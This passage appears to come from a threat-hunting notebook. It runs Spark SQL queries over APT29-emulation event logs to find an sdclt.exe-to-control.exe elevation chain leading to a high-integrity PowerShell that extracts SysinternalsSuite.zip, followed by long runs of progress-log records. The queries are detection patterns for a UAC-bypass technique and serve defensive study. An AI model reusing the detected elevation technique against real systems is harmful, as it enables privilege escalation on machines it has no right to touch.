 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;270&quot;
 
-RECORD 79----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;88&quot;
                                                                                                                                                                                                                                                                 
-RECORD 80----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;269&quot;
 
-RECORD 81----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 82----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;268&quot;
 
-RECORD 83----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 84----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;267&quot;
 
-RECORD 85----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;87&quot;
                                                                                                                                                                                                                                                                 
-RECORD 86----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;266&quot;
 
-RECORD 87----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 88----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;265&quot;
 
-RECORD 89----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 90----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;264&quot;
 
-RECORD 91----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;86&quot;
                                                                                                                                                                                                                                                                 
-RECORD 92----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;263&quot;
 
-RECORD 93----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 94----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;262&quot;
 
-RECORD 95----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 96----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;261&quot;
 
-RECORD 97----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;85&quot;
                                                                                                                                                                                                                                                                 
-RECORD 98----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;260&quot;
 
-RECORD 99----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;84&quot;
                                                                                                                                                                                                                                                                 
only showing top 100 rows
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:09F29912-8E93-461E-9E89-3F06F6763383</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4104</span>
<span class="sd">    AND LOWER(f.ScriptBlockText) LIKE &quot;%expand-archive%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
Expand-Archive -LiteralPath &quot;$env:USERPROFILE\Downloads\SysinternalsSuite.zip&quot; -DestinationPath &quot;$env:USERPROFILE\Downloads\&quot;

ScriptBlock ID: 63fc6cf4-cd9f-4134-9231-51ccb5c7d247
Path:  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:B5F24262-9373-43A4-A83F-0DBB708BD2C0</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">    AND f.EventID = 4103</span>
<span class="sd">    AND LOWER(f.Payload) LIKE &quot;%expand-archive%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Expand-Archive): &quot;Expand-Archive&quot;
ParameterBinding(Expand-Archive): name=&quot;LiteralPath&quot;; value=&quot;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&quot;
ParameterBinding(Expand-Archive): name=&quot;DestinationPath&quot;; value=&quot;C:\Users\pbeesly\Downloads\&quot;
ParameterBinding(Expand-Archive): name=&quot;Path&quot;; value=&quot;&quot;
ParameterBinding(Expand-Archive): name=&quot;Force&quot;; value=&quot;False&quot;
                                                                                                                                                                                                                                     
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Completed&quot;; value=&quot;True&quot;
                                                                                                                                                                                                                                                                                                                                                                                                                               
-RECORD 2-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;308&quot;
 
-RECORD 3-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;100&quot;
                                                                                                                                                                                                                                                                
-RECORD 4-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;307&quot;
 
-RECORD 5-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;100&quot;
                                                                                                                                                                                                                                                                
-RECORD 6-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;306&quot;
 
-RECORD 7-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
